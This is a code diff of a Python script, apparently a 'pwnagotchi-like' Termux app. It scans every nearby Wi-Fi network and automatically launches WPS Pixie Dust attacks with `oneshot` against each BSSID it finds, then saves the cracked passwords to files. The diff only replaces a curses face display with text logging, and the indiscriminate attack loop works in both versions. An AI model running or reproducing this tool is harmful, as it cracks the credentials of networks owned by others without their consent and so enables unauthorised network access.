@@ -1,22 +1,20 @@
 #!/usr/bin/env python3
 """
-pwnagotchi-like Termux app with custom scanning and per-BSSID attacks
+pwnagotchi-like Termux app with simple text-based logging
 Uses `iw dev <interface> scan` and `oneshot -b` non-interactively.
 All code in one file. Python 3.9+
 Features:
   - Background Wi-Fi scanning via `iw`
   - Per-BSSID Pixie Dust attacks: `sudo oneshot -i wlan0 -b <BSSID> -K`
-  - Dynamic curses UI with ASCII pet face + counters
+  - Text-based output: logs each cycle with counters and a simple emoticon
   - Re-scans every 5s when idle
   - Saves each cracked PSK in ~/cracked
-Note: Ensure Wi‑Fi scanning is allowed (hotspot off, location enabled if needed).
 """
 import os
 import sys
 import subprocess
 import time
 import re
-import curses
 from datetime import datetime
 
 # Configuration
@@ -28,15 +26,6 @@ ONESHOT_CMD = 'oneshot'
 
 os.makedirs(CRACKED_DIR, exist_ok=True)
 
-# ASCII faces
-def face_lines(state):
-    faces = {
-        'neutral': [r'  -   -  ', r' ( o   o )', r'   \___/  '],
-        'happy':   [r'  ^   ^  ', r' ( o ^ o )', r'   \___/  '],
-        'sad':     [r'  -   -  ', r' ( o . o )', r'   \___/  ']
-    }
-    return faces.get(state, faces['neutral'])
-
 # Scan for BSSIDs using iw
 def scan_networks(interface):
     try:
@@ -46,22 +35,22 @@ def scan_networks(interface):
         output = proc.stdout
     except subprocess.CalledProcessError:
         return []
-
     bssids = []
     for line in output.splitlines():
         line = line.strip()
         if line.startswith('BSS '):
             parts = line.split()
             if len(parts) >= 2:
-                bssid = parts[1]
-                bssids.append(bssid)
-    return list(dict.fromkeys(bssids))  # unique
+                bssids.append(parts[1])
+    return list(dict.fromkeys(bssids))
 
-# Run oneshot attack on a BSSID
+# Attack a single BSSID
 def attack_bssid(bssid):
-    cmd = ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K']
     try:
-        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=ATTACK_TIMEOUT)
+        proc = subprocess.run(
+            ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K'],
+            capture_output=True, text=True, timeout=ATTACK_TIMEOUT
+        )
         return proc.stdout + proc.stderr
     except subprocess.TimeoutExpired:
         return ''
@@ -72,7 +61,7 @@ def attack_bssid(bssid):
 def parse_psks(output):
     return re.findall(r'PSK:\s*(\S+)', output)
 
-# Save cracked PSK
+# Save cracked credentials
 def save_crack(bssid, psk):
     ts = datetime.now().strftime('%Y%m%d_%H%M%S')
     filename = f"{ts}_{bssid.replace(':','')}.txt"
@@ -80,50 +69,46 @@ def save_crack(bssid, psk):
     with open(path, 'w') as f:
         f.write(f"BSSID: {bssid}\nPSK: {psk}\n")
 
-# Main curses UI
-def ui_loop(stdscr):
-    curses.curs_set(False)
-    stdscr.nodelay(False)
-    state = 'neutral'
+# Main loop
+def main():
+    if os.geteuid() != 0:
+        print("[!] Please run as root (tsu)")
+        sys.exit(1)
+
+    cycle = 0
     total_scanned = 0
     total_cracked = 0
 
-    while True:
-        # Perform scan
-        bssids = scan_networks(INTERFACE)
-        count_scan = len(bssids)
-        total_scanned += count_scan
+    print("[+] Pwnagotchi-Termux text mode starting...")
+    print(f"[+] Interface: {INTERFACE}, Scan interval: {SCAN_INTERVAL}s\n")
 
-        # Attack each network
-        cracked_this_cycle = 0
+    while True:
+        cycle += 1
+        start_time = datetime.now().strftime('%H:%M:%S')
+
+        bssids = scan_networks(INTERFACE)
+        scanned_now = len(bssids)
+        total_scanned += scanned_now
+
+        cracked_now = 0
         for bssid in bssids:
-            output = attack_bssid(bssid)
-            psks = parse_psks(output)
+            out = attack_bssid(bssid)
+            psks = parse_psks(out)
             if psks:
-                cracked_this_cycle += len(psks)
+                cracked_now += len(psks)
                 for psk in psks:
                     save_crack(bssid, psk)
 
-        total_cracked += cracked_this_cycle
-        state = 'happy' if cracked_this_cycle else 'sad'
+        total_cracked += cracked_now
+        state_icon = '^_^' if cracked_now else '-_-'  # simple emoticon
 
-        # Draw UI
-        stdscr.clear()
-        for idx, line in enumerate(face_lines(state)):
-            stdscr.addstr(idx, 0, line)
-        stdscr.addstr(5, 0, f"Total scanned: {total_scanned}")
-        stdscr.addstr(6, 0, f"Total cracked: {total_cracked}")
-        stdscr.addstr(8, 0, f"Last cycle: scanned {count_scan}, cracked {cracked_this_cycle}")
-        stdscr.addstr(10, 0, "Press Ctrl+C to quit")
-        stdscr.refresh()
+        # Log cycle result
+        print(f"[{start_time}] Cycle {cycle}: Scanned {scanned_now} nets, Cracked {cracked_now} | Totals => Scanned: {total_scanned}, Cracked: {total_cracked} {state_icon}")
 
         time.sleep(SCAN_INTERVAL)
 
 if __name__ == '__main__':
-    if os.geteuid() != 0:
-        print("[!] Please run as root (tsu)")
-        sys.exit(1)
     try:
-        curses.wrapper(ui_loop)
+        main()
     except KeyboardInterrupt:
-        pass
+        print("\n[!] Exiting... Goodbye!")
